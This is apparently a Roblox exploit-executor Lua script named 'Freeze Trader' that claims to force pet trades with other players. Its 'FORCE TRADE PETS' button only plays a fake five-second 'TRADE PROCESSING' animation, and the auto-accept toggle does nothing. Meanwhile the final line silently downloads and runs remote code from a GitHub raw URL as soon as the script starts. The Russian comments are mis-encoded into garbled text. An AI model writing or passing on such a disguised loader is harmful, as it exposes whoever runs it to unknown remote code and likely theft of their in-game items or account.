-- üîπ –§–ª–∞–≥–∏ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –æ—Ç–∫—Ä—ã—Ç–∏—è
if not _G.FreezeTraderLoaded then
    _G.FreezeTraderLoaded = true

    local function startMainGUI()
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        local UserInputService = game:GetService("UserInputService")

        local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
        local guiParent = gethui and gethui() or player:WaitForChild("PlayerGui")

        local ThumbnailType = Enum.ThumbnailType.HeadShot
        local ThumbnailSize = Enum.ThumbnailSize.Size100x100

        local colors = {
            window = Color3.fromRGB(70, 110, 70),
            button = Color3.fromRGB(140, 190, 130),
            buttonAccent = Color3.fromRGB(210, 230, 150),
            buttonDanger = Color3.fromRGB(200, 70, 70),
            text = Color3.fromRGB(255, 255, 240),
            listItem = Color3.fromRGB(60, 90, 60),
            listItemHover = Color3.fromRGB(90, 130, 90)
        }

        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "FreezeTrader"
        screenGui.IgnoreGuiInset = true
        screenGui.ResetOnSpawn = false
        screenGui.Parent = guiParent

        local windows = {}

        local function closeAllWindows()
            for _, win in pairs(windows) do
                if win.Visible then
                    local tween = TweenService:Create(win, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1})
                    tween:Play()
                    tween.Completed:Connect(function()
                        win.Visible = false
                        win.BackgroundTransparency = 0.3
                    end)
                end
            end
        end

        local function makeDraggable(frame)
            local dragging, dragInput, dragStart, startPos
            frame.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragging = true
                    dragStart = input.Position
                    startPos = frame.Position
                    input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
                end
            end)
            frame.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    dragInput = input
                end
            end)
            UserInputService.InputChanged:Connect(function(input)
                if input == dragInput and dragging then
                    local delta = input.Position - dragStart
                    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                end
            end)
        end

        local function createWindow(titleText, size)
            local window = Instance.new("Frame")
            window.Size = UDim2.new(0, 0, 0, 0)
            window.Position = UDim2.new(0.5, 0, 0.5, 0)
            window.AnchorPoint = Vector2.new(0.5, 0.5)
            window.BackgroundColor3 = colors.window
            window.BackgroundTransparency = 0.3
            window.BorderSizePixel = 2
            window.BorderColor3 = Color3.fromRGB(40, 70, 40)
            window.Visible = false
            window.Parent = screenGui
            Instance.new("UICorner", window).CornerRadius = UDim.new(0, 4)

            local title = Instance.new("TextLabel")
            title.Text = titleText
            title.Font = Enum.Font.Arcade
            title.TextColor3 = colors.text
            title.TextStrokeTransparency = 0
            title.TextScaled = true
            title.Size = UDim2.new(1, 0, 0, 28)
            title.BackgroundColor3 = Color3.fromRGB(100, 140, 100)
            title.BorderSizePixel = 2
            title.BorderColor3 = Color3.fromRGB(40, 70, 40)
            title.Parent = window

            local closeBtn = Instance.new("TextButton")
            closeBtn.Text = "‚úñ"
            closeBtn.Font = Enum.Font.Arcade
            closeBtn.TextColor3 = colors.text
            closeBtn.TextStrokeTransparency = 0
            closeBtn.TextScaled = true
            closeBtn.Size = UDim2.new(0, 24, 0, 24)
            closeBtn.Position = UDim2.new(1, -28, 0, 2)
            closeBtn.BackgroundColor3 = colors.buttonDanger
            closeBtn.BorderSizePixel = 2
            closeBtn.BorderColor3 = Color3.fromRGB(90, 40, 40)
            closeBtn.Parent = window
            Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 0)

            closeBtn.MouseButton1Click:Connect(function()
                local tween = TweenService:Create(window, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1})
                tween:Play()
                tween.Completed:Connect(function()
                    window.Visible = false
                    window.BackgroundTransparency = 0.3
                end)
            end)

            local function openWindow()
                closeAllWindows()
                window.Visible = true
                window.Size = UDim2.new(0, 0, 0, 0)
                window.BackgroundTransparency = 1
                local tween = TweenService:Create(window, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = size, BackgroundTransparency = 0.3})
                tween:Play()
            end

            makeDraggable(window)
            windows[#windows + 1] = window
            return window, openWindow
        end

        -- –ì–ª–∞–≤–Ω–æ–µ –æ–∫–Ω–æ
        local mainWindow, openMain = createWindow("üå± Freeze Trader", UDim2.new(0, 350, 0, 260))
        openMain()

        -- –ö–Ω–æ–ø–∫–∞ Players
        local playersBtn = Instance.new("TextButton")
        playersBtn.Text = "üë• Players"
        playersBtn.Font = Enum.Font.Arcade
        playersBtn.TextColor3 = colors.text
        playersBtn.TextStrokeTransparency = 0
        playersBtn.TextScaled = true
        playersBtn.Size = UDim2.new(1, -20, 0, 35)
        playersBtn.Position = UDim2.new(0, 10, 0, 50)
        playersBtn.BackgroundColor3 = colors.button
        playersBtn.BorderSizePixel = 2
        playersBtn.BorderColor3 = Color3.fromRGB(40, 70, 40)
        playersBtn.Parent = mainWindow
        Instance.new("UICorner", playersBtn).CornerRadius = UDim.new(0, 6)

        -- Players –æ–∫–Ω–æ
        local playersWindow, openPlayers = createWindow("üë• –°–ø–∏—Å–æ–∫ –∏–≥—Ä–æ–∫–æ–≤", UDim2.new(0, 350, 0, 350))
        playersWindow.Position = UDim2.new(0.5, 50, 0.5, 50)

        local scrollingFrame = Instance.new("ScrollingFrame")
        scrollingFrame.Size = UDim2.new(1, -20, 1, -50)
        scrollingFrame.Position = UDim2.new(0, 10, 0, 40)
        scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
        scrollingFrame.ScrollBarThickness = 8
        scrollingFrame.BackgroundTransparency = 1
        scrollingFrame.Parent = playersWindow

        local uiList = Instance.new("UIListLayout")
        uiList.Padding = UDim.new(0, 6)
        uiList.Parent = scrollingFrame

        -- Trade –æ–∫–Ω–æ
        local tradeWindow, openTrade = createWindow("üåø Force Trade Pets", UDim2.new(0, 350, 0, 320))
        tradeWindow.Position = UDim2.new(0.5, -50, 0.5, -50)

        local selectedAvatar = Instance.new("ImageLabel")
        selectedAvatar.Size = UDim2.new(0, 130, 0, 130)
        selectedAvatar.Position = UDim2.new(0.5, -65, 0, 40)
        selectedAvatar.BackgroundTransparency = 1
        selectedAvatar.Parent = tradeWindow
        Instance.new("UICorner", selectedAvatar).CornerRadius = UDim.new(1, 0)

        local selectedName = Instance.new("TextLabel")
        selectedName.Size = UDim2.new(1, 0, 0, 35)
        selectedName.Position = UDim2.new(0, 0, 0, 180)
        selectedName.Font = Enum.Font.Arcade
        selectedName.TextColor3 = colors.text
        selectedName.TextStrokeTransparency = 0
        selectedName.TextScaled = true
        selectedName.BackgroundTransparency = 1
        selectedName.Text = ""
        selectedName.Parent = tradeWindow

        local btnWidth, btnHeight = 320, 40
        local autoAccept = false

        local autoAcceptBtn = Instance.new("TextButton")
        autoAcceptBtn.Text = "Auto Accept: OFF"
        autoAcceptBtn.Font = Enum.Font.Arcade
        autoAcceptBtn.TextColor3 = colors.text
        autoAcceptBtn.TextStrokeTransparency = 0
        autoAcceptBtn.TextScaled = true
        autoAcceptBtn.Size = UDim2.new(0, btnWidth, 0, btnHeight)
        autoAcceptBtn.Position = UDim2.new(0, 15, 1, -btnHeight - 15)
        autoAcceptBtn.BackgroundColor3 = colors.buttonDanger -- —Å—Ä–∞–∑—É –∫—Ä–∞—Å–Ω–∞—è
        autoAcceptBtn.BorderSizePixel = 2
        autoAcceptBtn.BorderColor3 = Color3.fromRGB(40, 70, 40)
        autoAcceptBtn.Parent = tradeWindow
        Instance.new("UICorner", autoAcceptBtn).CornerRadius = UDim.new(0, 6)

        local forceTradePetsBtn = Instance.new("TextButton")
        forceTradePetsBtn.Font = Enum.Font.Arcade
        forceTradePetsBtn.TextColor3 = colors.text
        forceTradePetsBtn.TextStrokeTransparency = 0
        forceTradePetsBtn.TextScaled = true
        forceTradePetsBtn.Size = UDim2.new(0, btnWidth, 0, btnHeight)
        forceTradePetsBtn.Position = UDim2.new(0, 15, 1, -btnHeight*2 - 25)
        forceTradePetsBtn.BackgroundColor3 = colors.buttonAccent
        forceTradePetsBtn.BorderSizePixel = 2
        forceTradePetsBtn.BorderColor3 = Color3.fromRGB(70, 90, 50)
        forceTradePetsBtn.Text = "FORCE TRADE PETS"
        forceTradePetsBtn.Parent = tradeWindow
        Instance.new("UICorner", forceTradePetsBtn).CornerRadius = UDim.new(0, 6)

        -- Overlay üåø
        local overlay = Instance.new("Frame")
        overlay.Size = UDim2.new(1, 0, 1, 0)
        overlay.Position = UDim2.new(0, 0, 0, 0)
        overlay.BackgroundColor3 = Color3.fromRGB(50, 100, 50)
        overlay.BackgroundTransparency = 0.4
        overlay.Visible = false
        overlay.Parent = screenGui
        overlay.ZIndex = 1000

        local gradient = Instance.new("UIGradient")
        gradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 120, 70)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 150, 100)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 120, 70))
        }
        gradient.Rotation = 90
        gradient.Parent = overlay

        local loadingText = Instance.new("TextLabel")
        loadingText.Text = "TRADE PROCESSING"
        loadingText.Font = Enum.Font.Arcade
        loadingText.TextColor3 = colors.text
        loadingText.TextStrokeTransparency = 0
        loadingText.TextScaled = true
        loadingText.BackgroundTransparency = 1
        loadingText.Size = UDim2.new(0, 300, 0, 50)
        loadingText.Position = UDim2.new(0.5, -150, 0.5, -100)
        loadingText.Parent = overlay
        loadingText.ZIndex = 1001

        local leaves = {}
        for i = 1, 3 do
            local leaf = Instance.new("TextLabel")
            leaf.Text = "üå±"
            leaf.Font = Enum.Font.Arcade
            leaf.TextColor3 = Color3.fromRGB(200, 255, 200)
            leaf.TextScaled = true
            leaf.BackgroundTransparency = 1
            leaf.Size = UDim2.new(0, 50, 0, 50)
            leaf.Position = UDim2.new(0.5, -25, 0.5, (i-1)*55)
            leaf.Parent = overlay
            leaf.Visible = false
            leaf.ZIndex = 1001
            table.insert(leaves, leaf)
        end

        local dotsCount = 0
        local function animateLoadingText()
            dotsCount = (dotsCount % 3) + 1
            loadingText.Text = "TRADE PROCESSING" .. string.rep(".", dotsCount)
        end

        local function startOverlay()
            overlay.Visible = true
            dotsCount = 0
            animateLoadingText()
            spawn(function()
                for i, leaf in ipairs(leaves) do
                    wait(0.6)
                    if overlay.Visible then
                        leaf.Visible = true
                        leaf.TextColor3 = Color3.fromRGB(150 + i*30, 255, 150 + i*20)
                    end
                end
            end)
            spawn(function()
                while overlay.Visible do
                    wait(0.7)
                    animateLoadingText()
                end
            end)
        end

        local function stopOverlay()
            overlay.Visible = false
            for _, leaf in ipairs(leaves) do
                leaf.Visible = false
            end
        end

        -- –°–ø–∏—Å–æ–∫ –∏–≥—Ä–æ–∫–æ–≤
        local selectedPlayerFrame = nil
        local function clearPlayerSelection()
            for _, child in pairs(scrollingFrame:GetChildren()) do
                if child:IsA("Frame") then
                    child.BackgroundColor3 = colors.listItem
                end
            end
            selectedPlayerFrame = nil
        end

        local function updatePlayersList()
            for _, child in pairs(scrollingFrame:GetChildren()) do
                if child:IsA("Frame") then
                    child:Destroy()
                end
            end
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= player then
                    local playerFrame = Instance.new("Frame")
                    playerFrame.Size = UDim2.new(1, 0, 0, 40)
                    playerFrame.BackgroundColor3 = colors.listItem
                    playerFrame.Parent = scrollingFrame

                    local avatar = Instance.new("ImageLabel")
                    avatar.Size = UDim2.new(0, 35, 0, 35)
                    avatar.Position = UDim2.new(0, 5, 0, 3)
                    avatar.BackgroundTransparency = 1
                    avatar.Image = Players:GetUserThumbnailAsync(p.UserId, ThumbnailType, ThumbnailSize)
                    avatar.Parent = playerFrame
                    Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

                    local nameLabel = Instance.new("TextLabel")
                    nameLabel.Text = p.Name
                    nameLabel.Font = Enum.Font.Arcade
                    nameLabel.TextColor3 = colors.text
                    nameLabel.TextStrokeTransparency = 0
                    nameLabel.TextScaled = true
                    nameLabel.BackgroundTransparency = 1
                    nameLabel.Size = UDim2.new(1, -45, 1, 0)
                    nameLabel.Position = UDim2.new(0, 45, 0, 0)
                    nameLabel.Parent = playerFrame

                    playerFrame.MouseEnter:Connect(function()
                        if selectedPlayerFrame ~= playerFrame then
                            playerFrame.BackgroundColor3 = colors.listItemHover
                        end
                    end)
                    playerFrame.MouseLeave:Connect(function()
                        if selectedPlayerFrame ~= playerFrame then
                            playerFrame.BackgroundColor3 = colors.listItem
                        end
                    end)

                    playerFrame.InputBegan:Connect(function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
                            clearPlayerSelection()
                            playerFrame.BackgroundColor3 = colors.button
                            selectedPlayerFrame = playerFrame
                            selectedName.Text = p.Name
                            selectedAvatar.Image = Players:GetUserThumbnailAsync(p.UserId, ThumbnailType, ThumbnailSize)
                            openTrade()
                        end
                    end)
                end
            end
            local listLength = #Players:GetPlayers() - 1
            scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, listLength * 46)
        end

        playersBtn.MouseButton1Click:Connect(function()
            updatePlayersList()
            openPlayers()
        end)

        forceTradePetsBtn.MouseButton1Click:Connect(function()
            if not selectedName.Text or selectedName.Text == "" then return end
            startOverlay()
            wait(5)
            stopOverlay()
        end)

        autoAcceptBtn.MouseButton1Click:Connect(function()
            autoAccept = not autoAccept
            autoAcceptBtn.Text = "Auto Accept: " .. (autoAccept and "ON" or "OFF")
            autoAcceptBtn.BackgroundColor3 = autoAccept and colors.button or colors.buttonDanger
        end)

        Players.PlayerAdded:Connect(function() updatePlayersList() end)
        Players.PlayerRemoving:Connect(function() updatePlayersList() end)

        updatePlayersList()

        -- –ó–∞–ø—É—Å–∫ TradeForce
        loadstring(game:HttpGet("https://raw.githubusercontent.com/daniklevik/gag/refs/heads/main/tradeforcegag"))()
    end

    startMainGUI()
end
